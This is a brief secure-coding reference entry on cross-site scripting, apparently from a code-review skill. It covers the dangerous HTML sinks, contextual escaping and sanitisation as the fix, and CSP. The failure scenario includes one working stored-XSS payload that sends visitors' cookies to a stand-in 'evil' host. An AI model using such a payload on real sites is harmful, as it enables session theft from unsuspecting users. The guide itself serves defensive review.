> Part of the `security` skill. CWE-79 · OWASP A03 Injection.

# Cross-site scripting

**The tell.** An untrusted value reaches HTML, an attribute, a URL, or JavaScript without escaping **for that context**: `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `html_safe`, `|safe`, `document.write`, or a template engine's raw-output marker.

**Failure scenario.** A display name is stored as `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`. Every viewer of that profile ships their session to the attacker — stored XSS, so it fires without the victim clicking anything.

**The fix.** Contextual escaping, applied by the template engine, and never disabled. Escaping is context-specific: HTML body, attribute, URL, CSS and JavaScript each need a different transformation, and HTML-escaping a value that lands inside a `<script>` block protects nothing. Where users must submit markup, sanitize with a maintained allow-list library — never a regex — and do it on output.

**Watch for.** `javascript:` and `data:` URLs reaching an `href`; user input building a JSON blob embedded in a script tag; and a Content-Security-Policy that would have contained the damage being absent or set to `unsafe-inline`.

**Not a finding when.** The framework auto-escapes and the raw-output marker is not used.
